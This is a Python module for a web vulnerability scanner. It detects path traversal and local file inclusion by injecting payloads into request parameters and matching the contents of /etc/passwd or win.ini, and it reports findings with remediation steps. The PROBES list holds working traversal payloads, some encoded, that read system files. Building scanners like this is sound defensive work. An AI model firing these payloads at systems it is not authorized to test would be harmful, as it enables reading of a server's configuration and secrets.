"""Path traversal / local file inclusion detection (aggressive).

Injects traversal sequences that try to read two well-known, harmless system files
(``/etc/passwd`` on Unix, ``C:\\Windows\\win.ini`` on Windows) and confirms by matching the
file's content signature in the response but NOT in the baseline. Reading these marker files is
the standard, non-destructive proof of a traversal/LFI flaw; the check reads nothing else and
changes no state.
"""

from __future__ import annotations

import re
from collections.abc import AsyncIterator

from wraith.checks.base import BaseCheck
from wraith.context import ScanContext
from wraith.http_client import HTTPClient, HTTPClientError, Response
from wraith.injection import MAX_POINTS, InjectionPoint, points_from_context, send_probe
from wraith.models import Confidence, Finding, Severity

# (payload, signature). Signatures are specific to the target file to keep false positives near
# zero. A handful of depths/encodings covers the common cases without flooding the target.
_PASSWD = re.compile(r"root:.*?:0:0:", re.MULTILINE)
_WIN_INI = re.compile(r"(?i)\[(?:fonts|extensions|mail|files)\]")

PROBES: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("../../../../../../etc/passwd", _PASSWD),
    ("....//....//....//....//etc/passwd", _PASSWD),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", _PASSWD),
    ("/etc/passwd", _PASSWD),
    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", _PASSWD),
    ("../../../../../../windows/win.ini", _WIN_INI),
    ("..\\..\\..\\..\\..\\windows\\win.ini", _WIN_INI),
    ("%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", _WIN_INI),
)
REFERENCES = (
    "https://owasp.org/www-community/attacks/Path_Traversal",
    "https://cwe.mitre.org/data/definitions/22.html",
)


class PathTraversalCheck(BaseCheck):
    name = "path_traversal"
    severity_hint = Severity.HIGH
    description = "Path traversal / local file inclusion in parameters"
    enabled_by_default = True
    requires_aggressive = True

    async def run(self, ctx: ScanContext, http: HTTPClient) -> AsyncIterator[Finding]:
        for point in points_from_context(ctx)[:MAX_POINTS]:
            finding = await _probe(http, point)
            if finding is not None:
                yield finding


async def _probe(http: HTTPClient, point: InjectionPoint) -> Finding | None:
    try:
        baseline = await send_probe(http, point, point.baseline() or "1")
    except HTTPClientError:
        return None
    for payload, signature in PROBES:
        try:
            response = await send_probe(http, point, payload)
        except HTTPClientError:
            continue
        match = signature.search(response.text)
        if match is not None and not signature.search(baseline.text):
            return _finding(point, payload, match.group(0), response)
    return None


def _finding(point: InjectionPoint, payload: str, matched: str, response: Response) -> Finding:
    target_file = "/etc/passwd" if ":0:0:" in matched else "C:\\Windows\\win.ini"
    return Finding(
        check=PathTraversalCheck.name,
        title=f"Path traversal / LFI in parameter {point.param!r}",
        url=point.action,
        severity=Severity.HIGH,
        confidence=Confidence.CONFIRMED,
        description=(
            f"The {point.source} parameter {point.param!r} ({point.method}) is used to build a "
            f"file path without sanitization: the payload {payload!r} returned the contents of "
            f"{target_file} (matched {matched[:60]!r}). An attacker can read arbitrary files the "
            "web server can access, which may include source code, configuration, and secrets."
        ),
        remediation=(
            "Never build file paths from user input. Map requests to a fixed allowlist of files, "
            "reject any path containing '..', separators, or null bytes, and canonicalize then "
            "verify the resolved path stays within an intended base directory."
        ),
        evidence=(response.exchange.to_evidence(matched),),
        references=REFERENCES,
    )
